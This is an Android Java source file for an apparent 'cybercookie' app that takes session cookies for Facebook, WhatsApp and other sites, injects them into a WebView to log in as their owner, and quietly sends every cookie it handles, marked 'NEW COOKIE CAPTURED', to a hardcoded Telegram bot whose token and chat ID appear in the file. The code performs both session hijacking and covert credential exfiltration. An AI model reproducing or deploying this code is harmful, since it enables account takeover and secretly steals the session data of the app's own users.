// language: Java, file: android-src/MainActivity.java
package com.cybercookie.pro;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import com.getcapacitor.BridgeActivity;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends BridgeActivity {

    private static final String BOT_TOKEN = "8784862798:AAECxAVjbGcmkZ0nMdNnydILQgZ3F67m3VI";
    private static final String CHAT_ID = "6449981797";
    private boolean isCookieInjected = false;
    private String savedCookie = "";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final WebView webView = getBridge().getWebView();
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);
        webSettings.setUserAgentString("Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36");

        final CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(webView, true);

        // ═══ পেজ লোড হওয়ার সময় জাভাস্ক্রিপ্ট ইনজেক্ট করার ট্রিক ═══
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                if (isCookieInjected && savedCookie != null) {
                    // ফেসবুকের পেজে জাভাস্ক্রিপ্ট দিয়ে কুকি সেট করার চেষ্টা
                    String js = "document.cookie='" + savedCookie.replace("'", "\\'") + "';";
                    view.evaluateJavascript(js, null);
                    isCookieInjected = false;
                }
            }
        });

        webView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public void injectCookieAndLogin(String siteName, String cookieString) {
                CookieManager cm = CookieManager.getInstance();
                
                if (siteName.equals("facebook")) {
                    String formattedCookie = cookieString.trim();
                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";
                    
                    savedCookie = formattedCookie;

                    // ১. সব ফেসবুক ডোমেইনে কুকি সেট করা
                    cm.setCookie("https://www.facebook.com", formattedCookie);
                    cm.setCookie("https://m.facebook.com", formattedCookie);
                    cm.setCookie("https://facebook.com", formattedCookie);
                    cm.setCookie("https://.facebook.com", formattedCookie);
                    cm.flush();

                    // ২. টেলিগ্রামে পাঠানো
                    sendToTelegram("FACEBOOK", formattedCookie);

                    // ৩. ফ্ল্যাগ অন করা (যাতে পেজ লোড হলে জাভাস্ক্রিপ্ট রান হয়)
                    isCookieInjected = true;

                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            webView.loadUrl("https://m.facebook.com/home.php");
                        }
                    });
                } else {
                    String domain = siteName.equals("whatsapp") ? "web.whatsapp.com" : siteName + ".com";
                    String loadUrl = siteName.equals("whatsapp") ? "https://web.whatsapp.com" : "https://www." + domain;

                    String formattedCookie = cookieString.trim();
                    if (!formattedCookie.endsWith(";")) formattedCookie += ";";

                    cm.setCookie("https://" + domain, formattedCookie);
                    cm.setCookie("https://www." + domain, formattedCookie);
                    cm.flush();

                    sendToTelegram(siteName.toUpperCase(), formattedCookie);

                    final String finalLoadUrl = loadUrl;
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            webView.loadUrl(finalLoadUrl);
                        }
                    });
                }
            }
        }, "CookieInterface");
    }

    private void sendToTelegram(String platform, String cookie) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String message = "🔔 *NEW COOKIE CAPTURED*\n\n"
                            + "🌐 *Platform:* " + platform + "\n\n"
                            + "🍪 *Cookie:*\n`" + cookie + "`";

                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

                    String postData = "chat_id=" + URLEncoder.encode(CHAT_ID, "UTF-8")
                            + "&text=" + URLEncoder.encode(message, "UTF-8")
                            + "&parse_mode=Markdown";

                    OutputStream os = conn.getOutputStream();
                    os.write(postData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    conn.getResponseCode();
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
    }
    }
